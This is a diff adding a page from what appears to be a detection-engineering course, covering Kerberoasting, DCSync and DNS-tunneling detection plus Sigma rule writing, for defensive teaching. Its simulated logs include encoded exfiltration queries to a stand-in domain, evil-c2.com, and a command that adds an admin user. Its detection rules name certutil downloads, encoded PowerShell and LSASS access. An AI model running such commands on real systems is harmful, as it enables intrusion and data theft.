+        if (event[&quot;eid&quot;] == 4769
+                and event.get(&quot;ticket_encryption_type&quot;) == &quot;0x17&quot;):
+            rc4_requests[event[&quot;user&quot;]].append(event[&quot;service&quot;])
+
+    alerts = []
+    for user, services in rc4_requests.items():
+        if len(services) &gt;= rc4_threshold:
+            alerts.append({
+                &quot;technique&quot;: &quot;T1558.003&quot;,
+                &quot;alert&quot;: &quot;kerberoasting&quot;,
+                &quot;user&quot;: user,
+                &quot;services_targeted&quot;: services,
+                &quot;count&quot;: len(services),
+            })
+    return alerts
+
+for alert in detect_kerberoasting(KERBEROS_EVENTS):
+    print(f&quot;[{alert[&#x27;technique&#x27;]}] {alert[&#x27;user&#x27;]} requested {alert[&#x27;count&#x27;]} RC4 TGS: {alert[&#x27;services_targeted&#x27;]}&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>detect_dcsync(events: list) -&gt; list</code> that flags DCSync attempts. DCSync leaves EID 4662 in the Security log with <code>ObjectType</code> matching the GUID for DS-Replication-Get-Changes-All: <code>{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}</code>. The event also contains <code>AccessMask: 0x100</code>. Flag any such event where the account performing the operation is not a known Domain Controller computer account (computer accounts end in <code>$</code>).</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>dc_events = [
+    {&quot;eid&quot;: 4662, &quot;time&quot;: &quot;2024-04-10T12:00:00&quot;,
+     &quot;subject_user&quot;: &quot;mimikatz_runner&quot;,
+     &quot;object_type&quot;: &quot;{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}&quot;,
+     &quot;access_mask&quot;: &quot;0x100&quot;},
+    {&quot;eid&quot;: 4662, &quot;time&quot;: &quot;2024-04-10T12:01:00&quot;,
+     &quot;subject_user&quot;: &quot;DC02$&quot;,
+     &quot;object_type&quot;: &quot;{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}&quot;,
+     &quot;access_mask&quot;: &quot;0x100&quot;},
+    {&quot;eid&quot;: 4662, &quot;time&quot;: &quot;2024-04-10T12:02:00&quot;,
+     &quot;subject_user&quot;: &quot;alice&quot;,
+     &quot;object_type&quot;: &quot;{bf967aba-0de6-11d0-a285-00aa003049e2}&quot;,
+     &quot;access_mask&quot;: &quot;0x20&quot;},
+]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output:</p>
+<pre><code>[ALERT] T1003.006 DCSync: mimikatz_runner requested replication rights at 2024-04-10T12:00:00
+</code></pre><hr />
+<h3>Concept 3 — Data Collection and Exfiltration (T1074, T1041)</h3>
+<p>After achieving objectives, the attacker collects and exfiltrates data. Collection: staging data in a local directory or volume shadow copy, using <code>net use</code> to access file shares, querying databases directly. Exfiltration: over C2 channel (HTTP/HTTPS beaconing), via cloud storage (uploading to Google Drive, Dropbox, S3), DNS tunneling, or encrypted custom protocol.</p>
+<p>Detection focus: large outbound data transfers (bytes out &gt;&gt; bytes in — check NetFlow), connections to cloud storage providers from servers that should not make such connections, high-frequency DNS queries with long subdomains (DNS tunneling), and <code>net use</code> commands accessing unusual shares.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import re
+from collections import defaultdict
+
+# Simulated DNS query logs
+DNS_EVENTS = [
+    {&quot;time&quot;: &quot;2024-04-10T13:00:00&quot;, &quot;src_ip&quot;: &quot;10.0.0.5&quot;,
+     &quot;query&quot;: &quot;normal-website.com&quot;, &quot;query_type&quot;: &quot;A&quot;},
+    {&quot;time&quot;: &quot;2024-04-10T13:00:01&quot;, &quot;src_ip&quot;: &quot;10.0.0.5&quot;,
+     &quot;query&quot;: &quot;dGhpcyBpcyBzb21lIHN0b2xlbiBkYXRhIGZyb20gdGhlIHNlcnZlcg==.evil-c2.com&quot;,
+     &quot;query_type&quot;: &quot;TXT&quot;},
+    {&quot;time&quot;: &quot;2024-04-10T13:00:02&quot;, &quot;src_ip&quot;: &quot;10.0.0.5&quot;,
+     &quot;query&quot;: &quot;aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q=.evil-c2.com&quot;,
+     &quot;query_type&quot;: &quot;TXT&quot;},
+    {&quot;time&quot;: &quot;2024-04-10T13:01:00&quot;, &quot;src_ip&quot;: &quot;10.0.0.10&quot;,
+     &quot;query&quot;: &quot;google.com&quot;, &quot;query_type&quot;: &quot;A&quot;},
+]
+
+def detect_dns_tunneling(events: list,
+                          subdomain_length_threshold: int = 30,
+                          frequency_threshold: int = 2) -&gt; list:
+    &quot;&quot;&quot;Flag: long subdomains (possible encoded data) + high query frequency to same domain.&quot;&quot;&quot;
+    domain_queries = defaultdict(list)
+    alerts = []
+
+    for event in events:
+        query = event[&quot;query&quot;]
+        parts = query.split(&quot;.&quot;)
+        if len(parts) &gt;= 2:
+            subdomain = &quot;.&quot;.join(parts[:-2])
+            base_domain = &quot;.&quot;.join(parts[-2:])
+        else:
+            continue
+
+        if len(subdomain) &gt;= subdomain_length_threshold:
+            domain_queries[base_domain].append({
+                &quot;src_ip&quot;: event[&quot;src_ip&quot;],
+                &quot;full_query&quot;: query,
+                &quot;subdomain_len&quot;: len(subdomain),
+            })
+
+    for domain, queries in domain_queries.items():
+        if len(queries) &gt;= frequency_threshold:
+            total_bytes = sum(q[&quot;subdomain_len&quot;] for q in queries)
+            alerts.append({
+                &quot;technique&quot;: &quot;T1071.004&quot;,
+                &quot;alert&quot;: &quot;dns_tunneling&quot;,
+                &quot;c2_domain&quot;: domain,
+                &quot;query_count&quot;: len(queries),
+                &quot;estimated_bytes_exfiltrated&quot;: total_bytes,
+            })
+    return alerts
+
+for alert in detect_dns_tunneling(DNS_EVENTS):
+    print(f&quot;[{alert[&#x27;technique&#x27;]}] DNS tunneling to {alert[&#x27;c2_domain&#x27;]}: &quot;
+          f&quot;{alert[&#x27;query_count&#x27;]} queries, ~{alert[&#x27;estimated_bytes_exfiltrated&#x27;]} bytes&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>detect_large_outbound(netflow_records: list, baseline_bytes_out: int, multiplier: float) -&gt; list</code> that flags source IPs whose total bytes_out in a session exceeds <code>baseline_bytes_out * multiplier</code>, and where the destination port is 443 (HTTPS) or 80 (HTTP) to an external IP (not RFC 1918).</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import ipaddress
+
+def is_private(ip: str) -&gt; bool:
+    return ipaddress.ip_address(ip).is_private
+
+netflow = [
+    {&quot;src_ip&quot;: &quot;10.0.0.5&quot;, &quot;dst_ip&quot;: &quot;203.0.113.50&quot;, &quot;dst_port&quot;: 443,
+     &quot;bytes_out&quot;: 52_000_000, &quot;bytes_in&quot;: 1_200},
+    {&quot;src_ip&quot;: &quot;10.0.0.6&quot;, &quot;dst_ip&quot;: &quot;203.0.113.60&quot;, &quot;dst_port&quot;: 443,
+     &quot;bytes_out&quot;: 450_000, &quot;bytes_in&quot;: 800_000},
+    {&quot;src_ip&quot;: &quot;10.0.0.7&quot;, &quot;dst_ip&quot;: &quot;10.0.0.1&quot;, &quot;dst_port&quot;: 443,
+     &quot;bytes_out&quot;: 100_000_000, &quot;bytes_in&quot;: 200},
+]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output:</p>
+<pre><code>[ALERT] T1041 Exfiltration Over C2: 10.0.0.5 → 203.0.113.50:443 — 52000000 bytes out (43x baseline)
+</code></pre><hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> Automated lateral movement path analysis<br />
+<strong>Threat:</strong> Attackers use BloodHound (graph-based AD analysis) combined with LLMs to generate a written attack narrative: &quot;given these AD relationships, here is the 4-step privilege escalation path from ServiceAccount01 to Domain Admin&quot; — reducing time-to-DA from hours to minutes<br />
+<strong>Opportunity:</strong> Defenders export BloodHound data and ask an LLM to summarize the highest-risk lateral movement paths, prioritize remediation (disable this SPN, rotate that password, remove this GPO delegation), and generate Sigma rules for the specific paths identified<br />
+<strong>Prompt to try:</strong> <code>&quot;You are a detection engineer. Given these 5 Windows Security event log entries showing NTLM network logons from the same source IP to 4 different hosts within 30 seconds, write a KQL query that would detect this pattern in Microsoft Sentinel, and explain each clause of the query.&quot;</code></p>
+<hr />
+<h2 id="day-5">Day 5 — Building the First Sigma Rules</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="06-5"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=h8-Mnjq6EsU" target="_blank" rel="noopener"><b>Write a Sigma rule in 120 seconds</b><small>SOC Prime</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=Sigma%20rules%20detection%20engineering%20write%20first%20Sigma%20rule%20YAML%20structure" target="_blank" rel="noopener">Sigma rules detection engineering write first Sigma rule YAML structure</a></p></div>
+<hr />
+<h3>Concept 1 — Sigma Rule Anatomy and Metadata Standards</h3>
+<p>A Sigma rule is a vendor-neutral YAML detection that compiles to KQL, SPL, ES Query, SQL, and others via the <code>sigma-cli</code> tool. Every Sigma rule has a fixed schema: identification fields, metadata, log source specification, detection logic, and response fields. The detection logic uses a combination of keyword lists and field-value conditions joined by logical operators.</p>
+<p>This is the equivalent of a dbt model — write once, generate platform-specific SQL for any target. A Sigma rule generates target-specific SIEM queries just as dbt generates target-specific SQL.</p>
+<p>Understanding the schema is critical before writing a single rule. Key sections: <code>title</code>, <code>id</code> (UUID), <code>status</code> (experimental/test/stable), <code>author</code>, <code>date</code>, <code>logsource</code> (product, category, service), <code>detection</code> (selection + condition), <code>falsepositives</code>, <code>level</code> (informational/low/medium/high/critical), <code>tags</code> (ATT&amp;CK technique IDs).</p>
+<p><strong>Example:</strong></p>
+<pre><code># Sigma rule: LOLBin CertUtil Download
+title: CertUtil Download via URLCache
+id: 19b09bed-5591-4f81-b5b4-48d8e0a4d30a
+status: experimental
+description: Detects CertUtil.exe being used to download files using the URLCache flag
+author: Detection Team
+date: 2024-04-10
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|endswith: &#x27;\certutil.exe&#x27;
+        CommandLine|contains|all:
+            - &#x27;-urlcache&#x27;
+            - &#x27;http&#x27;
+    condition: selection
+falsepositives:
+    - Legitimate certificate management
+level: high
+tags:
+    - attack.execution
+    - attack.t1105
+</code></pre><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import yaml
+import uuid
+
+def create_sigma_skeleton(
+    title: str,
+    description: str,
+    logsource: dict,
+    detection: dict,
+    technique: str,
+    level: str = &quot;medium&quot;,
+    author: str = &quot;Detection Team&quot;,
+) -&gt; str:
+    &quot;&quot;&quot;Generate a valid Sigma rule YAML string.&quot;&quot;&quot;
+    rule = {
+        &quot;title&quot;: title,
+        &quot;id&quot;: str(uuid.uuid4()),
+        &quot;status&quot;: &quot;experimental&quot;,
+        &quot;description&quot;: description,
+        &quot;author&quot;: author,
+        &quot;date&quot;: &quot;2024-04-10&quot;,
+        &quot;logsource&quot;: logsource,
+        &quot;detection&quot;: detection,
+        &quot;falsepositives&quot;: [&quot;Unknown&quot;],
+        &quot;level&quot;: level,
+        &quot;tags&quot;: [
+            f&quot;attack.{technique.lower()}&quot;,
+            f&quot;attack.{technique.replace(&#x27;.&#x27;, &#x27;_&#x27;).lower()}&quot;,
+        ],
+    }
+    return yaml.dump(rule, default_flow_style=False, allow_unicode=True, sort_keys=False)
+
+skeleton = create_sigma_skeleton(
+    title=&quot;PowerShell Encoded Command Execution&quot;,
+    description=&quot;Detects PowerShell executing base64-encoded commands via -EncodedCommand flag&quot;,
+    logsource={&quot;category&quot;: &quot;process_creation&quot;, &quot;product&quot;: &quot;windows&quot;},
+    detection={
+        &quot;selection&quot;: {
+            &quot;Image|endswith&quot;: [&quot;\\powershell.exe&quot;, &quot;\\pwsh.exe&quot;],
+            &quot;CommandLine|contains&quot;: [&quot;-EncodedCommand&quot;, &quot;-enc &quot;],
+        },
+        &quot;condition&quot;: &quot;selection&quot;,
+    },
+    technique=&quot;T1059.001&quot;,
+    level=&quot;high&quot;,
+)
+print(skeleton)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write a function <code>validate_sigma_rule(rule_yaml: str) -&gt; tuple[bool, list]</code> that returns <code>(is_valid, errors)</code>. Validate: (1) required keys present (<code>title</code>, <code>id</code>, <code>logsource</code>, <code>detection</code>, <code>level</code>), (2) <code>level</code> is one of <code>informational|low|medium|high|critical</code>, (3) <code>detection</code> contains a <code>condition</code> key, (4) <code>id</code> is a valid UUID format (hex with hyphens, 36 chars).</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>valid_rule = &quot;&quot;&quot;
+title: Test Rule
+id: 19b09bed-5591-4f81-b5b4-48d8e0a4d30a
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: &#x27;\\\\cmd.exe&#x27;
+  condition: selection
+level: high
+&quot;&quot;&quot;
+
+invalid_rule = &quot;&quot;&quot;
+title: Bad Rule
+id: not-a-uuid
+logsource:
+  product: windows
+detection:
+  selection:
+    Image: cmd.exe
+level: veryhigh
+&quot;&quot;&quot;
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output:</p>
+<pre><code>valid_rule: (True, [])
+invalid_rule: (False, [&#x27;invalid uuid format&#x27;, &#x27;invalid level: veryhigh&#x27;, &#x27;detection missing condition key&#x27;])
+</code></pre><hr />
+<h3>Concept 2 — Writing Detection Logic: Conditions and Modifiers</h3>
+<p>Sigma's detection logic uses named selections combined with Boolean conditions. Modifiers transform how values are matched: <code>|contains</code> (substring), <code>|startswith</code>, <code>|endswith</code>, <code>|re</code> (regex), <code>|all</code> (all values must match), <code>|contains|all</code> (all substrings must be present). Conditions combine selections: <code>selection and not filter</code>, <code>selection1 or selection2</code>, <code>1 of selection*</code>.</p>
+<p>The condition <code>selection and not filter</code> is the workhorse of detection engineering: select the suspicious pattern, then subtract known-good (benign admin tools, IT processes). Getting the filter right reduces false positives without creating blind spots.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code># Demonstrate Sigma condition logic in Python (mirrors how sigma-cli processes rules)
+
+def evaluate_sigma_detection(event: dict, rule: dict) -&gt; bool:
+    &quot;&quot;&quot;
+    Evaluate a simplified Sigma detection block against a single event.
+    Supports: selection (field conditions), filter (exclusions), condition (and/not).
+    &quot;&quot;&quot;
+    detection = rule[&quot;detection&quot;]
+    condition_str = detection[&quot;condition&quot;]
+
+    def check_selection(sel_name: str) -&gt; bool:
+        sel = detection.get(sel_name, {})
+        for field_modifier, values in sel.items():
+            field_parts = field_modifier.split(&quot;|&quot;)
+            field = field_parts[0]
+            modifiers = field_parts[1:] if len(field_parts) &gt; 1 else []
+            event_value = str(event.get(field, &quot;&quot;))
+
+            if isinstance(values, str):
+                values = [values]
+
+            if &quot;all&quot; in modifiers:
+                # all values must match
+                if not all(v.lower() in event_value.lower() for v in values):
+                    return False
+            elif &quot;endswith&quot; in modifiers:
+                if not any(event_value.lower().endswith(v.lower()) for v in values):
+                    return False
+            elif &quot;contains&quot; in modifiers:
+                if not any(v.lower() in event_value.lower() for v in values):
+                    return False
+            else:
+                if event_value not in (values if isinstance(values, list) else [values]):
+                    return False
+        return True
+
+    # Parse simple conditions: &quot;selection&quot;, &quot;selection and not filter&quot;
+    if condition_str == &quot;selection&quot;:
+        return check_selection(&quot;selection&quot;)
+    elif condition_str == &quot;selection and not filter&quot;:
+        return check_selection(&quot;selection&quot;) and not check_selection(&quot;filter&quot;)
+    return False
+
+rule = {
+    &quot;detection&quot;: {
+        &quot;selection&quot;: {
+            &quot;Image|endswith&quot;: [&quot;\\powershell.exe&quot;],
+            &quot;CommandLine|contains|all&quot;: [&quot;-enc&quot;, &quot;http&quot;],
+        },
+        &quot;filter&quot;: {
+            &quot;CommandLine|contains&quot;: [&quot;WindowsUpdate&quot;],
+        },
+        &quot;condition&quot;: &quot;selection and not filter&quot;,
+    }
+}
+
+test_events = [
+    {&quot;Image&quot;: &quot;C:\\Windows\\System32\\powershell.exe&quot;,
+     &quot;CommandLine&quot;: &quot;powershell -enc SQBFAFgAaAB0AHQAcAA=&quot;},
+    {&quot;Image&quot;: &quot;C:\\Windows\\System32\\powershell.exe&quot;,
+     &quot;CommandLine&quot;: &quot;powershell -enc http://WindowsUpdate/check&quot;},
+    {&quot;Image&quot;: &quot;C:\\Windows\\System32\\cmd.exe&quot;,
+     &quot;CommandLine&quot;: &quot;cmd.exe /c dir&quot;},
+]
+
+for event in test_events:
+    match = evaluate_sigma_detection(event, rule)
+    print(f&quot;{&#x27;[MATCH]&#x27; if match else &#x27;[no match]&#x27;} {event[&#x27;CommandLine&#x27;][:60]}&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Add support for the <code>1 of selection*</code> condition pattern to <code>evaluate_sigma_detection</code>. This condition means &quot;at least one selection whose name starts with <code>selection</code> must match.&quot; Test with a rule that has <code>selection_ps</code>, <code>selection_cmd</code>, and <code>condition: 1 of selection*</code>, verifying that an event matching only <code>selection_cmd</code> triggers the rule.</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>multi_rule = {
+    &quot;detection&quot;: {
+        &quot;selection_ps&quot;: {&quot;Image|endswith&quot;: [&quot;\\powershell.exe&quot;]},
+        &quot;selection_cmd&quot;: {&quot;Image|endswith&quot;: [&quot;\\cmd.exe&quot;],
+                          &quot;CommandLine|contains&quot;: [&quot;/c net user&quot;]},
+        &quot;condition&quot;: &quot;1 of selection*&quot;,
+    }
+}
+
+events_multi = [
+    {&quot;Image&quot;: &quot;C:\\Windows\\System32\\powershell.exe&quot;, &quot;CommandLine&quot;: &quot;Get-Process&quot;},
+    {&quot;Image&quot;: &quot;C:\\Windows\\System32\\cmd.exe&quot;, &quot;CommandLine&quot;: &quot;cmd.exe /c net user admin P@ss /add&quot;},
+    {&quot;Image&quot;: &quot;C:\\Windows\\System32\\notepad.exe&quot;, &quot;CommandLine&quot;: &quot;notepad.exe&quot;},
+]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output:</p>
+<pre><code>[MATCH] Get-Process                          (powershell.exe matches selection_ps)
+[MATCH] cmd.exe /c net user admin P@ss /add  (cmd.exe + /c net user matches selection_cmd)
+[no match] notepad.exe
+</code></pre><hr />
+<h3>Concept 3 — The <code>rules/</code> Folder: 5 Sigma Skeletons for W06 Royal Road</h3>
+<p>The Royal Road deliverable for this week is creating a <code>rules/</code> folder containing 5 Sigma rule YAML files, each targeting one of the techniques studied this week. Each file follows the Sigma schema and includes realistic detection logic, not just placeholders. These become the foundation for a growing detection rule library throughout the curriculum.</p>
+<p>The 5 rules cover: CertUtil download (T1105), PowerShell encoded command (T1059.001), scheduled task in suspicious path (T1053.005), LSASS process access (T1003.001), and Pass-the-Hash network logon pattern (T1550.002). Each rule must compile with sigma-cli (structure-valid YAML) and include at least one false-positive filter condition.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import os
+import yaml
+
+RULES_DIR = &quot;pipeline/rules&quot;
+
+RULE_TEMPLATES = [
+    {
+        &quot;filename&quot;: &quot;w06_certutil_urlcache.yml&quot;,
+        &quot;title&quot;: &quot;CertUtil URLCache Download&quot;,
+        &quot;id&quot;: &quot;a7b3d1e2-4c5f-6789-ab01-234567890abc&quot;,
+        &quot;status&quot;: &quot;experimental&quot;,
+        &quot;description&quot;: &quot;Detects certutil.exe downloading files via URLCache flag&quot;,
+        &quot;logsource&quot;: {&quot;category&quot;: &quot;process_creation&quot;, &quot;product&quot;: &quot;windows&quot;},
+        &quot;detection&quot;: {
+            &quot;selection&quot;: {
+                &quot;Image|endswith&quot;: &quot;\\certutil.exe&quot;,
+                &quot;CommandLine|contains|all&quot;: [&quot;-urlcache&quot;, &quot;http&quot;],
+            },
+            &quot;filter&quot;: {
+                &quot;CommandLine|contains&quot;: [&quot;windowsupdate.com&quot;, &quot;microsoft.com&quot;],
+            },
+            &quot;condition&quot;: &quot;selection and not filter&quot;,
+        },
+        &quot;falsepositives&quot;: [&quot;Legitimate certificate operations&quot;, &quot;WSUS clients&quot;],
+        &quot;level&quot;: &quot;high&quot;,
+        &quot;tags&quot;: [&quot;attack.command_and_control&quot;, &quot;attack.t1105&quot;],
+    },
+]
+
+def write_sigma_rules(rules: list, output_dir: str) -&gt; int:
+    os.makedirs(output_dir, exist_ok=True)
+    count = 0
+    for rule in rules:
+        filename = rule.pop(&quot;filename&quot;)
+        filepath = os.path.join(output_dir, filename)
+        with open(filepath, &quot;w&quot;) as f:
+            yaml.dump(rule, f, default_flow_style=False, allow_unicode=True, sort_keys=False)
+        count += 1
+        print(f&quot;Wrote {filepath}&quot;)
+    return count
+
+# In W06 Royal Road: run write_sigma_rules(RULE_TEMPLATES, RULES_DIR)
+print(f&quot;Template: {yaml.dump(RULE_TEMPLATES[0], default_flow_style=False)[:200]}...&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write the remaining 4 Sigma rule dicts (PowerShell encoded command, scheduled task in <code>\Temp\</code> or <code>\AppData\</code>, LSASS process access via Sysmon EID 10, Pass-the-Hash via EID 4624 Type 3 + NTLM from non-DC) and call <code>write_sigma_rules</code> to generate all 5 YAML files in <code>pipeline/rules/</code>. Each rule must have a unique UUID, at least one filter, and a <code>tags</code> list with the correct ATT&amp;CK technique.</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import uuid
+RULE_TEMPLATES_FULL = [
+    # ... add 4 more dicts following the schema above
+    # rule 2: powershell encoded command
+    # rule 3: scheduled task suspicious path
+    # rule 4: lsass process access
+    # rule 5: pass-the-hash
+]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output:</p>
+<pre><code>Wrote pipeline/rules/w06_certutil_urlcache.yml
+Wrote pipeline/rules/w06_powershell_encoded.yml
+Wrote pipeline/rules/w06_scheduled_task_suspicious_path.yml
+Wrote pipeline/rules/w06_lsass_process_access.yml
+Wrote pipeline/rules/w06_pass_the_hash.yml
+5 rules written to pipeline/rules/
+</code></pre><hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLM-assisted Sigma rule generation from threat intelligence<br />
+<strong>Threat:</strong> Adversaries analyze public Sigma rule repositories to understand detection coverage and modify techniques to evade the exact conditions in those rules — the detection community's openness becomes a training dataset for evasion<br />
+<strong>Opportunity:</strong> Given a CTI report or incident timeline, defenders ask an LLM to draft an initial Sigma rule skeleton, then refine detection logic, add filters, and tune the level — reducing first-draft time from 45 minutes to 5 minutes per rule while keeping the human in the loop for validation<br />
+<strong>Prompt to try:</strong> <code>&quot;Write a Sigma rule for the following attack behavior: a PowerShell process spawning from Microsoft Word, downloading a file from the internet, and executing it. Include logsource, detection with at least two selections, a filter for known-good parent processes, false positives, level, and ATT&amp;CK tags. Output valid YAML only.&quot;</code></p>
+<hr />
+<h2>Royal Road Standard — Week 06</h2>
+<p><strong>Task:</strong> Create a <code>pipeline/rules/</code> folder with 5 Sigma rule YAML files covering the key techniques from this week<br />
+<strong>Builds on:</strong> W05 coverage matrix (<code>pipeline/coverage.csv</code> + <code>pipeline/w05_coverage_map.py</code>) — these rules fill in the &quot;covered&quot; column for T1105, T1059.001, T1053.005, T1003.001, T1550.002<br />
+<strong>Deliverable:</strong> <code>pipeline/rules/w06_certutil_urlcache.yml</code>, <code>pipeline/rules/w06_powershell_encoded.yml</code>, <code>pipeline/rules/w06_scheduled_task_suspicious_path.yml</code>, <code>pipeline/rules/w06_lsass_process_access.yml</code>, <code>pipeline/rules/w06_pass_the_hash.yml</code> — all structure-valid YAML with UUID, logsource, detection, filter, level, and ATT&amp;CK tags<br />
+<strong>Stretch goal:</strong> Run <code>sigma check pipeline/rules/*.yml</code> (requires <code>sigma-cli</code> installed via <code>pip install sigma-cli</code>) to validate all rules compile without errors, and pipe the output to <code>pipeline/rules/validation_report.txt</code></p>
+<div class="pager"><a class="btn ghost" href="week-05.html">&larr; Week 05</a><a class="btn ghost" href="week-07.html">Week 07 &rarr;</a></div>
+</main></body></html>
